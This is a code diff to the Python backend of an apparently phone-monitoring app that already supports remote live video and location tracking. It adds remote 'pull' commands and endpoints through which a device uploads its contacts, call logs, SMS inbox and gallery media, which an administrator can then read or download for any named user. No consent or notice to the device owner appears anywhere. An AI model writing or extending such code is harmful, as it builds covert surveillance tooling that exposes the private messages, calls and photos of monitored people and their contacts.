@@ -269,6 +269,7 @@ VALID_REMOTE_COMMANDS = {
     "start_live_video", "stop_live_video",
     "boost_location_frequency", "normal_location_frequency",
     "panic_mode_on", "panic_mode_off",
+    "pull_contacts", "pull_call_logs", "pull_sms", "pull_media", "pull_all",
 }
 
 class RemoteCommandRequest(BaseModel):
@@ -5740,6 +5741,189 @@ async def admin_get_last_location(
     except Exception as e:
         logger.error(f"Last location error: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve last location")
+
+
+# ─── Device Data Pull Endpoints ───────────────────────────────────────────────
+
+DEVICE_DATA_DIR = "device_data"
+
+def _user_data_dir(user_id: int) -> str:
+    path = os.path.join(DEVICE_DATA_DIR, f"user_{user_id}")
+    os.makedirs(path, exist_ok=True)
+    return path
+
+@app.post("/device-data/contacts")
+async def device_upload_contacts(
+    payload: Dict,
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads its contacts list."""
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "contacts.json")
+    with open(path, "w") as f:
+        import json as _json
+        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "contacts": payload.get("contacts", [])}, f)
+    return {"status": "ok", "count": len(payload.get("contacts", []))}
+
+@app.post("/device-data/call-logs")
+async def device_upload_call_logs(
+    payload: Dict,
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads call log entries (Android only)."""
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "call_logs.json")
+    with open(path, "w") as f:
+        import json as _json
+        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "call_logs": payload.get("call_logs", [])}, f)
+    return {"status": "ok", "count": len(payload.get("call_logs", []))}
+
+@app.post("/device-data/sms")
+async def device_upload_sms(
+    payload: Dict,
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads SMS inbox (Android only)."""
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "sms.json")
+    with open(path, "w") as f:
+        import json as _json
+        _json.dump({"uploaded_at": datetime.now(timezone.utc).isoformat(), "messages": payload.get("messages", [])}, f)
+    return {"status": "ok", "count": len(payload.get("messages", []))}
+
+@app.post("/device-data/media/upload")
+async def device_upload_media(
+    file: UploadFile = File(...),
+    filename: str = Form(...),
+    media_type: str = Form(default="photo"),
+    created_at: str = Form(default=""),
+    album: str = Form(default="unknown"),
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads a single media file from gallery."""
+    user_id = int(getattr(current_user, 'id', 0))
+    media_dir = os.path.join(_user_data_dir(user_id), "media")
+    os.makedirs(media_dir, exist_ok=True)
+    safe_name = f"{uuid.uuid4().hex}_{os.path.basename(filename)}"
+    file_path = os.path.join(media_dir, safe_name)
+    content = await file.read()
+    with open(file_path, "wb") as f:
+        f.write(content)
+    # Append metadata entry
+    import json as _json
+    meta_path = os.path.join(_user_data_dir(user_id), "media_index.json")
+    meta = []
+    if os.path.exists(meta_path):
+        with open(meta_path) as f:
+            meta = _json.load(f)
+    meta.append({
+        "filename": safe_name,
+        "original_name": filename,
+        "media_type": media_type,
+        "album": album,
+        "created_at": created_at,
+        "size_bytes": len(content),
+        "uploaded_at": datetime.now(timezone.utc).isoformat(),
+    })
+    with open(meta_path, "w") as f:
+        _json.dump(meta, f)
+    return {"status": "ok", "saved_as": safe_name}
+
+# Admin read endpoints
+
+@app.get("/admin/device-data/{username}/contacts")
+async def admin_get_contacts(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "contacts.json")
+    if not os.path.exists(path):
+        return {"contacts": [], "uploaded_at": None}
+    import json as _json
+    with open(path) as f:
+        return _json.load(f)
+
+@app.get("/admin/device-data/{username}/call-logs")
+async def admin_get_call_logs(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "call_logs.json")
+    if not os.path.exists(path):
+        return {"call_logs": [], "uploaded_at": None}
+    import json as _json
+    with open(path) as f:
+        return _json.load(f)
+
+@app.get("/admin/device-data/{username}/sms")
+async def admin_get_sms(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "sms.json")
+    if not os.path.exists(path):
+        return {"messages": [], "uploaded_at": None}
+    import json as _json
+    with open(path) as f:
+        return _json.load(f)
+
+@app.get("/admin/device-data/{username}/media")
+async def admin_list_media(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    meta_path = os.path.join(_user_data_dir(int(target.id)), "media_index.json")
+    if not os.path.exists(meta_path):
+        return []
+    import json as _json
+    with open(meta_path) as f:
+        return _json.load(f)
+
+@app.get("/admin/device-data/{username}/media/{filename}")
+async def admin_download_media(
+    username: str,
+    filename: str,
+    request: Request,
+    token: Optional[str] = None,
+    db: Session = Depends(get_database_session),
+):
+    """Serves device media file. Accepts Bearer header OR ?token= query param (for browser <img>/<video> src)."""
+    raw_token = token
+    if not raw_token:
+        auth_header = request.headers.get("Authorization", "")
+        if auth_header.startswith("Bearer "):
+            raw_token = auth_header[7:]
+    if not raw_token:
+        raise HTTPException(status_code=401, detail="Missing token")
+    session = SessionService.validate_session(db, raw_token)
+    if not session:
+        raise HTTPException(status_code=401, detail="Invalid token")
+    admin = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
+    if not admin or not admin.is_admin:
+        raise HTTPException(status_code=403, detail="Admin only")
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    file_path = os.path.join(_user_data_dir(int(target.id)), "media", filename)
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path)
 
 
 # ─── Remote Command Endpoints ─────────────────────────────────────────────────
